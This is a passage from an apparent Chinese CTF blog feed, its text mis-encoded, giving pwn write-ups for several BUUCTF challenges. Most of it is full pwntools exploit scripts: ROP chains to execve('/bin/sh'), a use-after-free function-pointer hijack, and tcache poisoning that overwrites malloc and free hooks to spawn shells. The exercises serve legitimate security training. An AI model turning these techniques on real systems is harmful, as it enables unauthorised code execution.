class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()one = <span class="hljs-number">0x804857D</span><span class="hljs-comment"># debug()</span>payload = <span class="hljs-string">'%13$p'</span>sla(<span class="hljs-string">'name'</span>,payload)ru(<span class="hljs-string">'0x'</span>)key = int(r(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x40</span> + <span class="hljs-number">0x8</span>info_addr(<span class="hljs-string">'key'</span>,key)payload = p32(one)*<span class="hljs-number">9</span> + p32(key)sla(<span class="hljs-string">"?"</span>,payload)itr()</code></pre></div><p>å¤šè°ƒè¯•ï¼Œä¼šæ›´å®¹æ˜“ç†è§£ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTFæš‘å‡åˆ·é¢˜(1)</title>
    <link href="/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/"/>
    <url>/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTFæš‘å‡åˆ·é¢˜-1"><a href="#BUUCTFæš‘å‡åˆ·é¢˜-1" class="headerlink" title="BUUCTFæš‘å‡åˆ·é¢˜(1)"></a>BUUCTFæš‘å‡åˆ·é¢˜(1)</h1><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é™æ€é“¾æ¥ã€‚32ä½ç¨‹åºã€‚ç”¨<code>int 80h</code> è¿™ä¸ªä¸­æ–­è°ƒç”¨ï¼Œå‘¼å«ç³»ç»Ÿè°ƒç”¨ç¨‹åº<code>system_call()</code>.ã€‚</p><p>ç„¶årop æ§åˆ¶EAX = 0Xb = 11ï¼ŒEBX = &amp;(â€œ/bin/shâ€), ECX = EDX = 0ï¼Œå³æ‰§è¡Œäº†<code>sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)</code>ï¼Œå³å¯æ‹¿åˆ°shellã€‚</p><p>32ä½ç³»ç»Ÿè°ƒç”¨è¡¨ï¼š<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">https://blog.csdn.net/xiaominthere/article/details/17287965</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./simplerop'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29124</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()offset = <span class="hljs-number">32</span>start = <span class="hljs-number">0x8048E45</span>read = <span class="hljs-number">0x806CD50</span>pop_eax_ret = <span class="hljs-number">0x080bae06</span>pop_ebx_ret = <span class="hljs-number">0x080481c9</span>pop_ecx_ebx_ret = <span class="hljs-number">0x0806e851</span>pop_edx_ret = <span class="hljs-number">0x0806e82a</span>pop3_ret = <span class="hljs-number">0x08048913</span>bss = <span class="hljs-number">0x80EC2EC</span> - <span class="hljs-number">0x10</span>ret = <span class="hljs-number">0x8048E6F</span>in_t_0x80 = <span class="hljs-number">0x080493e1</span>payload = <span class="hljs-string">'a'</span> * offset + flat([read,pop3_ret,<span class="hljs-number">0</span>,bss,<span class="hljs-number">0x8</span>])payload += flat([pop_eax_ret,<span class="hljs-number">11</span>,pop_ecx_ebx_ret,<span class="hljs-number">0</span>,bss,pop_edx_ret,<span class="hljs-number">0</span>,in_t_0x80])sa(<span class="hljs-string">':'</span>,payload)s(<span class="hljs-string">'/bin/sh\x00'</span>)itr()</code></pre></div><p>å…¶ä¸­ropé“¾readåè¿”å›åœ°å€ï¼š<code>pop3_ret</code>ï¼Œæ˜¯ä¸ºäº†pop <code>0,bss,0x8</code>ï¼Œç„¶åå†è·Ÿç€ropã€‚</p><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a><code>ciscn_2019_n_3</code></h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18 ,å­˜åœ¨UAFæ¼æ´ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">rec_str_free</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span>&#123;  <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)ptr + <span class="hljs-number">2</span>));  <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Note freed!"</span>);&#125;</code></pre></div><p>æ¯åˆ›å»ºä¸€ä¸ªå †ï¼Œå°±æœ‰ä¸€ä¸ª0x10çš„å †ç©ºé—´ï¼Œå­˜æ”¾å‡½æ•°æŒ‡é’ˆã€‚ä¸€çœ‹åˆ°è¿™ä¸ªï¼Œå°±å¯ä»¥è¯´æ˜¯æš—ç¤ºæ”»å‡»è¿™ä¸ªåœ°æ–¹æ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_del</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span>  v0 = ask((<span class="hljs-keyword">int</span>)<span class="hljs-string">"Index"</span>);  <span class="hljs-keyword">return</span> (*(<span class="hljs-keyword">int</span> (__cdecl **)(<span class="hljs-keyword">int</span>))(records[v0] + <span class="hljs-number">4</span>))(records[v0]);&#125;</code></pre></div><p>åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚<br>å…ˆ<code>new(0,2,0x40,payload)</code>çœ‹ä¸€ä¸‹ç¨‹åºçš„å†…å­˜æƒ…å†µ, å¯¹äºå…¶ä¸­çš„<code>(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0])</code> ï¼š</p><div class="hljs"><pre><code class="hljs c">gefâ¤  p &amp;records$<span class="hljs-number">1</span> = (&lt;data variable, no debug info&gt; *) <span class="hljs-number">0x804b080</span> &lt;records&gt;gefâ¤  x/wx <span class="hljs-number">0x804b080</span><span class="hljs-number">0x804b080</span> &lt;records&gt;:    <span class="hljs-number">0x08635160</span>gefâ¤  x/wx <span class="hljs-number">0x08635160</span><span class="hljs-number">0x8635160</span>:      <span class="hljs-number">0x080486de</span></code></pre></div><p>æ‰€ä»¥ <code>records[v0]</code>  = 0x08635160 </p><div class="hljs"><pre><code class="hljs c">gefâ¤  x/wx <span class="hljs-number">0x08635160</span>+<span class="hljs-number">4</span><span class="hljs-number">0x8635164</span>:      <span class="hljs-number">0x08048725</span>gefâ¤  x/i <span class="hljs-number">0x08048725</span>   <span class="hljs-number">0x8048725</span> &lt;rec_str_free&gt;:    push   ebp</code></pre></div><p>æ‰€ä»¥ <code>*(int (__cdecl **)(int))(records[v0] + 4))</code>  = <code>0x8048725 &lt;rec_str_free&gt;:</code></p><p>ä¸”<br><img src="http://qiqianyun.chumen77.xyz/uPic/VT03Ns.png" srcset="/img/loading.gif" alt><br>å¦‚å›¾ï¼ŒæŠŠè¿™é‡Œçš„å‡½æ•°æŒ‡é’ˆæ§åˆ¶æˆ<code>sh\x00\00</code> + <code>&amp;system</code> ,å³æ‰§è¡Œ<code>do_del</code>æ—¶ï¼Œè¿è¡Œçš„å°±æ˜¯<code>system(sh)</code>å¯æ‹¿åˆ°shellã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_n_3'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26453</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span><span class="hljs-params">(id,type,len,context)</span>:</span>    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))    sla(<span class="hljs-string">"Type &gt;"</span>,str(type))    sla(<span class="hljs-string">"th &gt;"</span>,str(len))    sa(<span class="hljs-string">"ue &gt;"</span>,str(context))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))payload = <span class="hljs-string">"a"</span> + <span class="hljs-string">'\n'</span>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)system = elf.plt[<span class="hljs-string">'system'</span>]new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x9</span>,<span class="hljs-string">'sh\x00\x00'</span>+ p32(system))free(<span class="hljs-number">1</span>)itr()</code></pre></div><h4 id="æ— systemå‡½æ•°æƒ…å†µä¸‹"><a href="#æ— systemå‡½æ•°æƒ…å†µä¸‹" class="headerlink" title="æ— systemå‡½æ•°æƒ…å†µä¸‹"></a>æ— systemå‡½æ•°æƒ…å†µä¸‹</h4><p>Leak libcï¼Œè¿˜æ˜¯æ”»å‡»é‚£ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæœ¬åœ°é€šè¿œç¨‹æ²¡é€šã€‚</p><p>åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œç”±äºfgetsæ€»æ˜¯åœ¨ä½ ä¼ å…¥çš„å­—ç¬¦ä¸²ååŠ ä¸Š<code>\x00</code>ï¼Œæ›¾ç»å°±é‡åˆ°<br>è¿‡ï¼Œå¯¼è‡´æ³„æ¼ååˆ†éš¾è¿›è¡Œï¼Œä½†æ˜¯å‘ç°ï¼š</p><div class="hljs"><pre><code class="hljs python">payload = <span class="hljs-string">''</span>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x0</span>,payload)ru(<span class="hljs-string">"lue="</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d89d8</span></code></pre></div><p>ä¼ å…¥ç©ºå­—èŠ‚ç«Ÿç„¶å¯ä»¥é€šè¿‡ï¼Œä¸”æ²¡æœ‰åŠ ä¸Š<code>\x00</code>ï¼Œä»è€Œä¸å½±å“æ³„æ¼libcã€‚è¿˜ä¸çŸ¥é“æ˜¯å¦ä»¥åé‡åˆ°fgetså‡½æ•°å°±å¯ä»¥è¿™æ ·å¤„ç†å…¶å½±å“ï¼Œå…ˆæŒ–ä¸ªå‘ï¼Œè®°å½•ç€ã€‚</p><div class="hljs"><pre><code class="hljs python">payload = <span class="hljs-string">'a'</span> + <span class="hljs-string">'\n'</span>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,payload)new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,payload)free(<span class="hljs-number">0</span>)payload = <span class="hljs-string">''</span>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x0</span>,payload)ru(<span class="hljs-string">"lue="</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d89d8</span>info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">4</span> + <span class="hljs-string">'/bin/sh\x00'</span> +<span class="hljs-string">'\n'</span>new(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span><span class="hljs-number">-0x10</span><span class="hljs-number">-0x10</span>,payload)new(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)new(<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">4</span>)rec = libc_base + <span class="hljs-number">0x3d123</span>new(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x9</span>,p32(rec) + p32(rec))<span class="hljs-comment"># free(5)</span>show(<span class="hljs-number">5</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="V-amp-N2020easyTHeap"><a href="#V-amp-N2020easyTHeap" class="headerlink" title="V&amp;N2020easyTHeap"></a>V&amp;N2020easyTHeap</h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18 ,å­˜åœ¨UAFæ¼æ´ï¼Œtcache dupæ”»å‡»ã€‚</p><p>è€ƒç‚¹ï¼š</p><ul><li>æ”»å‡»<code>tcache_perthread_struct</code>ï¼Œä¼ªé€ tcacheå·²ç»æ»¡äº†</li><li>æ”»å‡»<code>tcache_entry</code>ï¼Œåœ¨æŒ‡å®šçš„ä½ç½®å†™ä¸Šç›®æ ‡åœ°å€ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå¯¹åº”å¤§å°çš„å †ï¼Œå³å¯å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3></li></ul><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./vn_pwn_easyTHeap'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>remote_libc = <span class="hljs-string">'./libc-2.27.so'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25814</span>)    libc = ELF(remote_libc)elf = ELF(local_file)<span class="hljs-comment"># libc = elf.libc</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">"choice"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">"?"</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,context)</span>:</span>    sla(<span class="hljs-string">"choice"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'content'</span>,str(context))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">"idx"</span>,str(idx))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()heapbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x260</span>info_addr(<span class="hljs-string">'heapbase'</span>,heapbase)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#2</span>edit(<span class="hljs-number">2</span>,p64(heapbase+<span class="hljs-number">0x10</span>))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#4</span>edit(<span class="hljs-number">4</span>,<span class="hljs-string">'\x07'</span>*<span class="hljs-number">0x10</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)__malloc_hook = libc_base + <span class="hljs-number">0x3ebc30</span>__realloc_hook = __malloc_hook <span class="hljs-number">-0x8</span>payload = <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">8</span>+<span class="hljs-number">7</span>) + <span class="hljs-string">'\x01'</span> + <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span> - <span class="hljs-number">8</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x38</span> + p64(__realloc_hook)edit(<span class="hljs-number">4</span>,payload)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#5</span>onerec = <span class="hljs-number">0x10a38c</span> + libc_baserealloc_addr = libc_base + libc.symbols[<span class="hljs-string">'__libc_realloc'</span>]info_addr(<span class="hljs-string">'relloc'</span>,realloc_addr)info_addr(<span class="hljs-string">'__malloc_hook'</span>,__malloc_hook)payload = p64(onerec) + p64(realloc_addr+<span class="hljs-number">8</span>)edit(<span class="hljs-number">5</span>,payload)add(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#debug()</span>itr()</code></pre></div><h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a><code>ciscn_2019_final_3</code></h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå­˜åœ¨uafæ¼æ´ã€‚</p><p>ç¨‹åºåªæœ‰å¢åŠ å’Œåˆ é™¤çš„åŠŸèƒ½ï¼Œä½†æ˜¯å¢åŠ ä¸€ä¸ªå †å—åå›ç»™ä½ è¿”å›ç”³è¯·å †å—çš„åœ°å€ä¿¡æ¯ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"gift :%p\n"</span>, heaplist[HIDWORD(size)]);</code></pre></div><p>åˆ é™¤å †åï¼Œæ²¡æœ‰ç½®0çš„æ“ä½œï¼Œå­˜åœ¨uafã€‚</p><p>è€ƒç‚¹ï¼š</p><ul><li>æ”»å‡»<code>tcache_perthread_struct</code>ï¼Œä¼ªé€ tcacheå·²ç»æ»¡äº†</li><li>æ”»å‡»<code>tcache_entry</code>ï¼Œåœ¨æŒ‡å®šçš„ä½ç½®å†™ä¸Šç›®æ ‡åœ°å€ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå¯¹åº”å¤§å°çš„å †ï¼Œå³å¯å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚</li></ul><p>éš¾ç‚¹ï¼š</p><ul><li>æ³„æ¼libcåœ°å€</li><li>ç²¾å·§çš„æ„é€ ä¸€ä¸ªä»»æ„åœ°å€å†™ï¼ˆåœ¨<code>tcache struct</code>å¤„æŠ˜è…¾ï¼‰</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs c">from pwn import *import timelocal_file  = './ciscn_final_3'local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'remote_libc = local_libc # './libc.so.6'context.log_level = 'debug'debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote('node3.buuoj.cn',27714)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = ['tmux','neww']rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()def add(idx,size,content):    sla("&gt;",'1')    sla('index',str(idx))    sla('size',str(size))    sa('thing',str(content))    ru("0x")    gift = int(r(12),16)    info_addr('gift',gift)    return giftdef free(idx):    sla("&gt;",'2')    sla("index",str(idx))heap_base = add(0,0x48,'a') - 0x11e70free(0)free(0)add(1,0x48,p64(heap_base+0x10))add(2,0x48,p64(heap_base+0x10))payload = 0x30 * '\x07'add(3,0x48,payload)free(3)payload = 0x30 * '\x00'add(4,0x48,payload)add(5,0x10,' ')libc_base = add(6,0x78,' ') - 0x3ebca0info_addr('libc_base',libc_base)free_hook = libc_base + 0x3ed8e8free(5)add(7,0x10,p64(free_hook)*2)one_rec = 0x4f322 + libc_baseadd(8,0x48,p64(one_rec))# debug()free(4)itr()</code></pre></div><p>è°ƒè¯•ä¸€ä¸‹å°±æ‡‚äº†ã€‚å…¶ä¸­0x10é‚£ä¸ªå †å—çš„ç”³è¯·å¾ˆé‡è¦ï¼Œæ­£å¥½å¯ä»¥ä¾›åé¢çš„ä½¿ç”¨ã€‚</p><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><code>picoctf_2018_rop chain</code></h2><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åªæ˜¯ä¸€ä¸ªç®€å•çš„ropï¼Œè€ƒçš„å°±æ˜¯32ä½ä¸‹å¦‚ä½•æ§åˆ¶ä¼ å‚æ•°ã€‚</p><h3 id="exp-4"><a 